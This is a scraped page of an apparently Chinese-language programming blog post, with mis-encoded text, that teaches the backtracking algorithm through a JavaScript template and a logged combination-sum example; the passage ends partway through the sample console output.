            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:17:39.000Z" title="Mon Jan 19 2026 11:17:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    61
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»32åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å›æº¯ç®—æ³•ï¼šé€‰â†’é’»â†’é€€ï¼ŒæŒæ¡ç©·ä¸¾çš„è‰ºæœ¯</h2>
<p>å›æº¯ç®—æ³•æ˜¯ç®—æ³•é¢†åŸŸçš„æ ¸å¿ƒæ€æƒ³ä¹‹ä¸€ï¼Œå°¤å…¶åœ¨å¤„ç†ã€Œç©·ä¸¾æ‰€æœ‰å¯èƒ½è§£ã€çš„é—®é¢˜æ—¶å ªç§°"ç¥å™¨"ã€‚æœ¬æ–‡å°†ä»æ ¸å¿ƒæ€è·¯å‡ºå‘ï¼Œé€šè¿‡"é€‰ä¸€ä¸ªæ•°â†’é’»åˆ°åº•â†’é€€å›æ¥åˆ æ‰è¿™ä¸ªæ•°â†’é€‰ä¸‹ä¸€ä¸ªæ•°â†’å†é’»åˆ°åº•"è¿™ä¸ªå›ºå®šèŠ‚å¥ï¼Œå¸¦ä½ å½»åº•æŒæ¡å›æº¯ç®—æ³•ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å›æº¯æ ¸å¿ƒåŸç†ï¼šé€‰â†’é’»â†’é€€çš„å›ºå®šèŠ‚å¥</h3>
<h4 data-id="heading-2">ä¸€å¥è¯è®°ç‰¢å›æº¯çš„æ‰§è¡Œè¿‡ç¨‹</h4>
<p><strong>é€‰ä¸€ä¸ªæ•°â†’é’»åˆ°åº•â†’é€€å›æ¥åˆ æ‰è¿™ä¸ªæ•°â†’é€‰ä¸‹ä¸€ä¸ªæ•°â†’å†é’»åˆ°åº•ï¼Œç›´åˆ°æ‰€æœ‰æ•°éƒ½è¯•å®Œï¼Œæœ€åæ”¶é›†æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„è·¯å¾„ã€‚</strong></p>
<p>é€‰äº†å°±å¾€ä¸‹é’»ï¼Œèµ°ä¸é€šå°±é€€å›æ¥æ“¦è„šå°ï¼Œæ¢æ¡è·¯å†è¯•ã€‚å¾ˆå¤šäººä¸€å¼€å§‹éƒ½ä¼šè¢«é€’å½’çš„å¤šå±‚è°ƒç”¨ç»•æ™•ï¼Œä½†åªè¦æŠ“ä½ <strong>pushï¼ˆé€‰æ•°ï¼‰â†’ é€’å½’ï¼ˆé’»æ·±å±‚ï¼‰â†’ popï¼ˆæ“¦è„šå°ï¼‰</strong> è¿™ä¸ªå›ºå®šèŠ‚å¥ï¼Œå†ç»“åˆå‰ªææå‰æ­¢æŸï¼Œæ‰€æœ‰å›æº¯é¢˜éƒ½èƒ½å¥—æ¨¡æ¿è§£å†³ï½</p>
<h4 data-id="heading-3">æ ¸å¿ƒå››è¦ç´ </h4>
<p>ä»»ä½•å›æº¯é—®é¢˜éƒ½èƒ½æ‹†è§£ä¸ºä»¥ä¸‹4ä¸ªæ ¸å¿ƒéƒ¨åˆ†ï¼š</p>






























<table><thead><tr><th>è¦ç´ </th><th>ä½œç”¨</th><th>ç¤ºä¾‹ï¼ˆç»„åˆæ€»å’Œï¼‰</th></tr></thead><tbody><tr><td><strong>è·¯å¾„</strong></td><td>å·²ç»åšå‡ºçš„é€‰æ‹©ï¼ˆæ¯”å¦‚é€‰äº†å“ªäº›æ•°ï¼‰</td><td><code>path = [2,3]</code>ï¼ˆè¡¨ç¤ºé€‰äº†2å’Œ3ï¼‰</td></tr><tr><td><strong>é€‰æ‹©åˆ—è¡¨</strong></td><td>å½“å‰æ­¥éª¤å¯é€‰æ‹©çš„é€‰é¡¹ï¼ˆæ¯”å¦‚è¿˜èƒ½é€‰å“ªäº›æ•°ï¼‰</td><td><code>nums = [2,3,6,7]</code>ï¼Œå·²é€‰2åˆ™å¯é€‰3/6/7</td></tr><tr><td><strong>ç»ˆæ­¢æ¡ä»¶</strong></td><td>ä»€ä¹ˆæ—¶å€™åœæ­¢æ¢ç´¢ï¼ˆæ‰¾åˆ°è§£/èµ°åˆ°åº•ï¼‰</td><td>è·¯å¾„å’Œç­‰äºç›®æ ‡å€¼ï¼Œæˆ–è·¯å¾„å’Œè¶…è¿‡ç›®æ ‡å€¼</td></tr><tr><td><strong>å‰ªæ</strong></td><td>æå‰æ’é™¤æ— æ•ˆè·¯å¾„ï¼ˆæ ¸å¿ƒä¼˜åŒ–ï¼‰</td><td>è·¯å¾„å’Œè¶…è¿‡ç›®æ ‡å€¼ï¼Œç›´æ¥åœæ­¢å½“å‰è·¯å¾„</td></tr></tbody></table>
<h4 data-id="heading-4">å…³é”®ç†è§£</h4>
<ul>
<li><strong>é€’å½’æ˜¯"å¾€ä¸‹é’»"</strong>ï¼šæ¯é€‰ä¸€ä¸ªæ•°ï¼Œå°±é€’å½’è°ƒç”¨backtrackï¼Œç›¸å½“äº"å¾€ä¸‹èµ°ä¸€æ­¥"</li>
<li><strong>return æ˜¯"å¾€å›é€€"</strong>ï¼šè§¦å‘ç»ˆæ­¢æ¡ä»¶ï¼ˆæ‰¾åˆ°è§£/å’Œè¶…äº†ï¼‰ï¼Œå°±ç»“æŸå½“å‰é€’å½’ï¼Œå›åˆ°ä¸Šä¸€å±‚</li>
<li><strong>pop æ˜¯"æ“¦è„šå°"</strong>ï¼šå›åˆ°ä¸Šä¸€å±‚åï¼Œå¿…é¡»æ‰§è¡Œ<code>path.pop()</code>ï¼ŒæŠŠåˆšæ‰é€‰çš„æ•°åˆ æ‰ï¼Œæ‰èƒ½"æ¢å¦ä¸€ä¸ªæ•°é€‰"</li>
<li><strong>for å¾ªç¯æ˜¯"é€‰å²”è·¯"</strong>ï¼šæ¯ä¸€å±‚çš„ for å¾ªç¯ï¼Œå°±æ˜¯åœ¨å½“å‰ä½ç½®é€‰ä¸åŒçš„æ•°ï¼ˆå²”è·¯ï¼‰ï¼Œè¯•å®Œä¸€æ¡å†è¯•ä¸‹ä¸€æ¡</li>
</ul>
<h4 data-id="heading-5">é€šç”¨æ¨¡æ¿</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å›æº¯æ ¸å¿ƒå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">è·¯å¾„, é€‰æ‹©åˆ—è¡¨, å…¶ä»–å‚æ•°</span>) {
  <span class="hljs-comment">// 1. ç»ˆæ­¢æ¡ä»¶ï¼šæ‰¾åˆ°è§£ï¼Œè®°å½•ç»“æœå¹¶è¿”å›</span>
  <span class="hljs-keyword">if</span> (æ»¡è¶³ç»ˆæ­¢æ¡ä»¶) {
    ç»“æœåˆ—è¡¨.<span class="hljs-title function_">push</span>(è·¯å¾„çš„æ‹·è´); <span class="hljs-comment">// æ³¨æ„ï¼šè¦æ‹·è´ï¼Œå¦åˆ™ä¼šè¢«åç»­ä¿®æ”¹</span>
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 2. éå†æ‰€æœ‰å¯é€‰é€‰é¡¹</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> é€‰é¡¹ <span class="hljs-keyword">of</span> é€‰æ‹©åˆ—è¡¨) {
    <span class="hljs-comment">// å‰ªæï¼šæå‰æ’é™¤æ— æ•ˆé€‰é¡¹ï¼ˆå…³é”®ä¼˜åŒ–ï¼‰</span>
    <span class="hljs-keyword">if</span> (é€‰é¡¹æ— æ•ˆ) <span class="hljs-keyword">continue</span>;

    <span class="hljs-comment">// 3. åšé€‰æ‹©ï¼šæŠŠå½“å‰é€‰é¡¹åŠ å…¥è·¯å¾„ï¼ˆé€‰æ•°ï¼‰</span>
    è·¯å¾„.<span class="hljs-title function_">push</span>(é€‰é¡¹);

    <span class="hljs-comment">// 4. é€’å½’æ¢ç´¢ï¼šåŸºäºå½“å‰é€‰æ‹©ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼ˆé’»åˆ°åº•ï¼‰</span>
    <span class="hljs-title function_">backtrack</span>(è·¯å¾„, æ–°çš„é€‰æ‹©åˆ—è¡¨, å…¶ä»–å‚æ•°);

    <span class="hljs-comment">// 5. æ’¤é”€é€‰æ‹©ï¼ˆå›æº¯æ ¸å¿ƒï¼‰ï¼šå›åˆ°ä¸Šä¸€æ­¥ï¼Œæ¢é€‰é¡¹ï¼ˆé€€å›æ¥â†’åˆ æ‰è¿™ä¸ªæ•°ï¼‰</span>
    è·¯å¾„.<span class="hljs-title function_">pop</span>();
  }
}

<span class="hljs-comment">// ä¸»å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">solveProblem</span>(<span class="hljs-params">å‚æ•°</span>) {
  <span class="hljs-keyword">const</span> ç»“æœåˆ—è¡¨ = []; <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„è§£</span>
  <span class="hljs-title function_">backtrack</span>([], åˆå§‹é€‰æ‹©åˆ—è¡¨, åˆå§‹å‚æ•°); <span class="hljs-comment">// åˆå§‹è·¯å¾„ä¸ºç©º</span>
  <span class="hljs-keyword">return</span> ç»“æœåˆ—è¡¨;
}
</code></pre>
<h3 data-id="heading-6">äºŒã€å…¥é—¨ç¤ºä¾‹ï¼šç»„åˆæ€»å’Œï¼ˆå¯è§†åŒ–ç†è§£ï¼‰</h3>
<p>ä¸ºäº†è®©ä½ å¿«é€Ÿç†è§£å›æº¯çš„æ ¸å¿ƒèŠ‚å¥ï¼Œæˆ‘ä»¬å…ˆä»<strong>ç»„åˆæ€»å’Œ</strong>è¿™ä¸ªç»å…¸å…¥é—¨é¢˜å…¥æ‰‹ï¼Œé€šè¿‡å¯è§†åŒ–æ‰“å°å®Œæ•´å±•ç¤ºã€Œé€‰â†’æ¢â†’æ’¤ã€çš„å…¨è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-7">é¢˜ç›®æè¿°</h4>
<p>ç»™å®šä¸€ä¸ªæ— é‡å¤å…ƒç´ çš„æ•°ç»„ <code>candidates</code> å’Œä¸€ä¸ªç›®æ ‡æ•° <code>target</code>ï¼Œæ‰¾å‡º <code>candidates</code> ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸º <code>target</code> çš„ç»„åˆï¼ˆæ•°å­—å¯ä»¥æ— é™åˆ¶é‡å¤è¢«é€‰å–ï¼‰ã€‚</p>
<ul>
<li>ç¤ºä¾‹ï¼šè¾“å…¥ <code>candidates = [2,3,7]</code>ï¼Œ<code>target = 7</code>ï¼Œè¾“å‡º <code>[[2,2,3],[7]]</code>ã€‚</li>
</ul>
<h4 data-id="heading-8">å®Œæ•´ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * ç»„åˆæ€»å’Œï¼šæ‰¾æ‰€æœ‰å’Œä¸ºç›®æ ‡å€¼çš„ç»„åˆï¼ˆå¯è§†åŒ–æ‰“å°ç‰ˆï¼‰
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">candidates</span> - å€™é€‰æ•°ç»„
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">target</span> - ç›®æ ‡å’Œ
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number[][]</span>} - æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆ
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">combinationSum</span>(<span class="hljs-params">candidates, target</span>) {
  <span class="hljs-keyword">const</span> result = []; <span class="hljs-comment">// å­˜å‚¨æœ€ç»ˆç»“æœ</span>
  candidates.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b); <span class="hljs-comment">// æ’åºä¾¿äºå‰ªæ</span>
  <span class="hljs-keyword">let</span> recursionLevel = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ‡è®°é€’å½’å±‚çº§ï¼Œç”¨äºå¯è§†åŒ–ç¼©è¿›</span>

  <span class="hljs-comment">// å›æº¯å‡½æ•°ï¼špath=å½“å‰è·¯å¾„ï¼Œsum=å½“å‰è·¯å¾„å’Œï¼Œstart=èµ·å§‹ç´¢å¼•ï¼ˆé¿å…é‡å¤ç»„åˆï¼‰</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path, sum, start</span>) {
    <span class="hljs-comment">// å±‚çº§+1ï¼Œç”Ÿæˆç¼©è¿›ï¼ˆæ¯çº§2ä¸ªç©ºæ ¼ï¼‰</span>
    recursionLevel++;
    <span class="hljs-keyword">const</span> indent = <span class="hljs-string">'  '</span>.<span class="hljs-title function_">repeat</span>(recursionLevel - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">const</span> levelTag = <span class="hljs-string">`ã€å±‚çº§<span class="hljs-subst">${recursionLevel}</span>ã€‘`</span>;

    <span class="hljs-comment">// ğŸŸ¢ è°ƒç”¨é˜¶æ®µï¼šæ‰“å°å½“å‰å±‚çº§åˆå§‹çŠ¶æ€</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
      <span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸŸ¢ <span class="hljs-subst">${levelTag}</span> è°ƒç”¨é˜¶æ®µ â†’ path=<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(path)}</span>, sum=<span class="hljs-subst">${sum}</span>, start=<span class="hljs-subst">${start}</span>`</span>
    );

    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶1ï¼šè·¯å¾„å’Œç­‰äºç›®æ ‡å€¼ï¼Œè®°å½•ç»“æœ</span>
    <span class="hljs-keyword">if</span> (sum === target) {
      result.<span class="hljs-title function_">push</span>([...path]); <span class="hljs-comment">// æ‹·è´è·¯å¾„ï¼Œé¿å…åç»­ä¿®æ”¹</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
        <span class="hljs-string">`<span class="hljs-subst">${indent}</span>âœ… <span class="hljs-subst">${levelTag}</span> æ‰¾åˆ°æœ‰æ•ˆç»„åˆ â†’ <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(path)}</span>ï¼Œresult=<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(result)}</span>`</span>
      );
      <span class="hljs-comment">// å±‚çº§-1ï¼Œå‡†å¤‡è¿”å›</span>
      recursionLevel--;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ”´ <span class="hljs-subst">${levelTag}</span> è¿”å›é˜¶æ®µ â†’ æ‰¾åˆ°è§£ï¼Œå›åˆ°ä¸Šä¸€å±‚`</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶2ï¼šè·¯å¾„å’Œè¶…è¿‡ç›®æ ‡å€¼ï¼Œç›´æ¥è¿”å›ï¼ˆå‰ªæï¼‰</span>
    <span class="hljs-keyword">if</span> (sum &gt; target) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸš« <span class="hljs-subst">${levelTag}</span> å‰ªæ â†’ sum=<span class="hljs-subst">${sum}</span> &gt; target=<span class="hljs-subst">${target}</span>ï¼Œç›´æ¥è¿”å›`</span>);
      recursionLevel--;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ”´ <span class="hljs-subst">${levelTag}</span> è¿”å›é˜¶æ®µ â†’ å‰ªæè¿”å›ï¼Œå›åˆ°ä¸Šä¸€å±‚`</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†é€‰æ‹©åˆ—è¡¨ï¼ˆä»startå¼€å§‹ï¼Œé¿å…é‡å¤ç»„åˆï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = start; i &lt; candidates.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> num = candidates[i];
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ” <span class="hljs-subst">${levelTag}</span> éå†i=<span class="hljs-subst">${i}</span> â†’ å°è¯•é€‰æ•°å­—<span class="hljs-subst">${num}</span>ï¼Œå½“å‰sum=<span class="hljs-subst">${sum}</span>`</span>);

      <span class="hljs-comment">// æ’åºå‰ªæï¼šå½“å‰æ•°+å·²é€‰å’Œ&gt;ç›®æ ‡å€¼ï¼Œåç»­æ•°æ›´å¤§ï¼Œæ— éœ€ç»§ç»­</span>
      <span class="hljs-keyword">if</span> (sum + num &gt; target) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
          <span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸš« <span class="hljs-subst">${levelTag}</span> æ’åºå‰ªæ â†’ <span class="hljs-subst">${sum}</span>+<span class="hljs-subst">${num}</span>=<span class="hljs-subst">${sum + num}</span> &gt; <span class="hljs-subst">${target}</span>ï¼Œbreakå¾ªç¯`</span>
        );
        <span class="hljs-keyword">break</span>;
      }

      <span class="hljs-comment">// åšé€‰æ‹©ï¼šåŠ å…¥å½“å‰æ•°ï¼ˆé€‰æ•°ï¼‰</span>
      path.<span class="hljs-title function_">push</span>(num);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
        <span class="hljs-string">`<span class="hljs-subst">${indent}</span>âœ… <span class="hljs-subst">${levelTag}</span> é€‰æ•°å­—<span class="hljs-subst">${num}</span> â†’ path=<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(path)}</span>, sum=<span class="hljs-subst">${sum + num}</span>`</span>
      );

      <span class="hljs-comment">// ğŸŸ¡ æš‚åœé˜¶æ®µï¼šè°ƒç”¨ä¸‹ä¸€å±‚ï¼Œå½“å‰å±‚çº§æš‚åœ</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸŸ¡ <span class="hljs-subst">${levelTag}</span> æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›`</span>);
      <span class="hljs-comment">// é€’å½’æ¢ç´¢ï¼šæ•°å­—å¯é‡å¤é€‰ï¼Œæ‰€ä»¥startä»ä¸ºiï¼ˆé’»åˆ°åº•ï¼‰</span>
      <span class="hljs-title function_">backtrack</span>(path, sum + num, i);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ”´ <span class="hljs-subst">${levelTag}</span> è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ`</span>);

      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼ˆé€€å›æ¥â†’åˆ æ‰è¿™ä¸ªæ•°ï¼‰</span>
      path.<span class="hljs-title function_">pop</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
        <span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ”µ <span class="hljs-subst">${levelTag}</span> æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—<span class="hljs-subst">${num}</span> â†’ path=<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(path)}</span>, sum=<span class="hljs-subst">${sum}</span>`</span>
      );
    }

    <span class="hljs-comment">// å±‚çº§-1ï¼Œå‡†å¤‡è¿”å›</span>
    recursionLevel--;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${indent}</span>ğŸ”´ <span class="hljs-subst">${levelTag}</span> è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚`</span>);
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„ã€å’Œä¸º0ã€ä»ç´¢å¼•0å¼€å§‹</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'========== å¼€å§‹æ‰§è¡Œç»„åˆæ€»å’Œ =========='</span>);
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'========== æ‰§è¡Œç»“æŸ =========='</span>);
  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-comment">// æµ‹è¯•ï¼šè¾“å…¥ [2,3,7], 7 â†’ è¾“å‡º [[2,2,3],[7]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æœ€ç»ˆç»“æœï¼š'</span>, <span class="hljs-title function_">combinationSum</span>([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>], <span class="hljs-number">7</span>));
</code></pre>
<p>å„ä¸ªå›¾æ ‡çš„å«ä¹‰ï¼š</p>
<ul>
<li>ğŸŸ¢ è°ƒç”¨é˜¶æ®µï¼šè¿›å…¥é€’å½’æ—¶çš„çŠ¶æ€</li>
<li>ğŸ” éå†é˜¶æ®µï¼šå°è¯•é€‰æ‹©æ•°å­—</li>
<li>âœ… é€‰æ‹©é˜¶æ®µï¼šæˆåŠŸé€‰æ‹©æ•°å­—</li>
<li>ğŸŸ¡ æš‚åœé˜¶æ®µï¼šè°ƒç”¨ä¸‹ä¸€å±‚é€’å½’</li>
<li>ğŸ”´ è¿”å›é˜¶æ®µï¼šä»ä¸‹ä¸€å±‚è¿”å›</li>
<li>ğŸ”µ æ’¤é”€é˜¶æ®µï¼šåˆ é™¤æ•°å­—ï¼ˆæ“¦è„šå°ï¼‰</li>
<li>ğŸš« å‰ªæé˜¶æ®µï¼šæå‰ç»ˆæ­¢æ— æ•ˆè·¯å¾„</li>
</ul>
<p><strong>æ§åˆ¶å°è¾“å‡ºç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">========== å¼€å§‹æ‰§è¡Œç»„åˆæ€»å’Œ ==========
ğŸŸ¢ ã€å±‚çº§1ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[], sum=0, start=0
ğŸ” ã€å±‚çº§1ã€‘ éå†i=0 â†’ å°è¯•é€‰æ•°å­—2ï¼Œå½“å‰sum=0
âœ… ã€å±‚çº§1ã€‘ é€‰æ•°å­—2 â†’ path=[2], sum=2
ğŸŸ¡ ã€å±‚çº§1ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
  ğŸŸ¢ ã€å±‚çº§2ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[2], sum=2, start=0
  ğŸ” ã€å±‚çº§2ã€‘ éå†i=0 â†’ å°è¯•é€‰æ•°å­—2ï¼Œå½“å‰sum=2
  âœ… ã€å±‚çº§2ã€‘ é€‰æ•°å­—2 â†’ path=[2,2], sum=4
  ğŸŸ¡ ã€å±‚çº§2ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
    ğŸŸ¢ ã€å±‚çº§3ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[2,2], sum=4, start=0
    ğŸ” ã€å±‚çº§3ã€‘ éå†i=0 â†’ å°è¯•é€‰æ•°å­—2ï¼Œå½“å‰sum=4
    âœ… ã€å±‚çº§3ã€‘ é€‰æ•°å­—2 â†’ path=[2,2,2], sum=6
    ğŸŸ¡ ã€å±‚çº§3ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
      ğŸŸ¢ ã€å±‚çº§4ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[2,2,2], sum=6, start=0
